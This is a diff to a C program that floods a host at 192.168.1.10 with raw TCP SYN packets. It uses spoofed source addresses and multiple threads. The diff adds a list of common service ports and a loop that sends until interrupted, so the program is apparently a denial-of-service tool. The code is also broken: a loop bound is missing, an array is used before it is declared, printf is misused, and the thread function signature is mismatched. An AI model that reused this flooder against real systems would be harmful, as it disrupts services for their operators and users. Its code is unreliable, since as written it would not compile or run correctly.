@@ -9,6 +9,14 @@
 #include <arpa/inet.h>
 #include <pthread.h>
 
+volatile sig_atomic_t quit_flag = 0;
+
+void sigint_handler(int signum){
+
+	quit_flag = 1;
+
+}
+
 // Pseudo header needed for TCP checksum calculation
 struct pseudo_header {
     u_int32_t source_address;
@@ -27,9 +35,9 @@ typedef struct totally_real_source{
 
 realsource gensource(){
 
-    realsource spair;
+	realsource spair;
 
-    srand(time(NULL));
+	srand(time(NULL));
 
 	spair.port = rand() % 40000;
 
@@ -83,7 +91,7 @@ unsigned short csum(unsigned short *ptr, int nbytes) {
 
 }
 
-void *send_tcp_packet(unsigned short sport, unsigned short dport, short void *threadid) {
+void *send_tcp_packet(unsigned short dport) {
 
 	realsource legitsrc = gensource();
 
@@ -107,7 +115,7 @@ void *send_tcp_packet(unsigned short sport, unsigned short dport, short void *th
 
     // Set the destination address
     dest_addr.sin_family = AF_INET;
-    dest_addr.sin_port = htons(80 + tid); // Destination Port
+    dest_addr.sin_port = htons(dport); // Destination Port
     dest_addr.sin_addr.s_addr = inet_addr("192.168.1.10"); // Destination IP
 
     // Fill in the IP Header
@@ -159,7 +167,7 @@ void *send_tcp_packet(unsigned short sport, unsigned short dport, short void *th
         exit(EXIT_FAILURE);
     }
 
-    printf("TCP SYN packet sent from thread %ld\n", tid);
+    printf("TCP SYN packet sent from thread to port " + dport);
 
     // Close the socket
     close(sockfd);
@@ -175,25 +183,33 @@ void *spam(void *tid){
 
 int main() {
 
+	signal(SIGINT, sigint_handler);
+
+	int lengtharray = sizeof(open_ports)/sizeof(open_ports[0]);
+	int open_ports[] = {80, 443, 8080, 22, 21};
 
 
-    pthread_t threads[NUM_THREADS];
-    int rc; //return code
-    long t; //thread
+    	pthread_t threads[NUM_THREADS];
+    	int rc; //return code
+    	long t; //thread
 
-    for (t = 0; t < NUM_THREADS; t++) {
+	while(!quit_flag){
 
-        printf("Creating thread %ld\n", t);
+		for (t = 0; t < ; t++) {
 
-        rc = pthread_create(&threads[t], NULL, send_tcp_packet, (void *)t);
+			printf("Creating thread %ld\n", t);
 
-        if (rc) {
+			rc = pthread_create(&threads[t], NULL, send_tcp_packet, (void *)t);
 
-            printf("ERROR; return code from pthread_create() is %d\n", rc);
-            exit(-1);
+        		if (rc) {
 
-        }
-    }
+            			printf("ERROR; return code from pthread_create() is %d\n", rc);
+            			exit(-1);
+
+        		}
+    		}
+
+	}
 
     // Wait for all threads to complete
     for (t = 0; t < NUM_THREADS; t++) {
